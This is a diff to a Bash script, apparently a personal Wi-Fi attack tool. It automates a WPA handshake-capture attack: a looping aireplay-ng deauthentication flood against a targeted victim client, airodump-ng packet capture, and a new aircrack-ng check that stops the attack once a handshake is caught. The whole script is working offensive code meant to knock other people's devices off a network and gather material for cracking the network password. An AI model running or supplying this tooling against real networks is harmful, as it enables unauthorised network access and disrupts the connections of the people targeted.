@@ -14,8 +14,11 @@
 #by needle wang
 #
 #version1.2:
+#2014年 11月 12日 星期三 03:52:57 CST
+#auto check the handshake
 #2014年 11月 11日 星期二 18:54:21 CST
 #add check_handshake
+#learn of BASHPID the first time, which is so important to me!
 #2014年 11月 02日 星期日 06:17:02 CST
 #change inputing essid to selecting essid.
 #and change grep essid to grep -F essid.
@@ -61,14 +64,39 @@ victim_mac="$2"
 sleep 2s
 while true
 do
-	aireplay-ng -0 2 -a "$ap_mac" -c "$victim_mac" mon0
-	sleep 5s
+	aireplay-ng -0 2 -a "$ap_mac" -c "$victim_mac" --ignore-negative-one mon0
+	sleep 6s
 done
 }
 
 check_handshake(){
 sleep 2s
-gnome-terminal -x watch aircrack-ng "essid_${essid}"*.cap
+#for show
+#gnome-terminal -x watch aircrack-ng "essid_${essid}"*.cap
+
+sub_proc=$(ps -o pid,cmd --ppid $$)
+pid_dump=$(echo "$sub_proc" | grep 'airodump-ng' | awk '{print $1}')
+
+#BASHPID is a unstable variable, must like this:
+subshell_pid=$BASHPID
+while true
+do
+    #if press ctrl-c, end the check_sub_shell.
+    #$$ is a constant!
+    if [ $(ps -o ppid -p $subshell_pid | tail -n 1) -ne $$ ]
+    then
+        break
+    fi
+    if aircrack-ng "essid_${essid}"*.cap | grep -o '([[:digit:]] handshake)' | grep -qv '(0 handshake)'
+    then
+        #kill aireplay and airodump
+        stop_replay
+        kill -15 $pid_dump
+        break
+    fi
+    sleep 2s
+done
+
 }
 
 stop_replay(){
@@ -79,9 +107,11 @@ stop_replay(){
 	#maybe because of $(ps)...
 	#note: in some window manager (such as gnome),
 	#after killing the parent pid, the sub-process's ppid could become 1~ (resolved here.)
-	subshell_pid_list=$(ps -o pid --ppid $$ --sort -start_time)
-	#should only one.
-	subshell_pid=$(echo "$subshell_pid_list" | tail -n 1)
+    
+    #sort is unusefull, the time is so close~
+	subshell_pid_list=$(ps -o pid --ppid $$ --sort start_time)
+	#according to the order of starting sub_shell
+    subshell_pid=$(echo "$subshell_pid_list" | sed -n '2p')
 
 	sub_process_list=$(ps -o pid --ppid ${subshell_pid})
 	#here is sleep's or aireplay-ng's pid
@@ -187,15 +217,17 @@ AP's channel is ${channel}
 AP's bssid   is ${bssid}
 victim's mac is ${client_mac}\n"
 read -ep "now start to dump, and replay will in background.
-If a handshake catched (just splash one time at the top-right of main terminal), press ctrl-c;
-or not catched, you can also press ctrl-c for stopping replay.
-after the dumping starts, 'watch aircrack-ng \"essid_${essid}*.cap\"' will run in another terminal.
-aircrack will report that if a handshake captured. pressing ctrl-c can close the terminal.
+If caught a handshake, it would turn to the next step(dump and replay would be killed).
+if you want to end dump and replay, just press ctrl-c for stopping replay.
+run 'watch aircrack-ng \"essid_${essid}*.cap\"' in another terminal to see that
+if a handshake captured as you wish.
 clear? [Press Enter]: "
 
 trap "stop_replay;" INT
 replay_for_wpa "$bssid" "$client_mac" &
+#echo 'replay_for_wpa id is' $! >/tmp/idsss
 check_handshake &
+#echo 'check_handshake id is' $! >>/tmp/idsss
 
 airodump-ng -c "$channel" --bssid "$bssid" -w "essid_${essid}" mon0
 
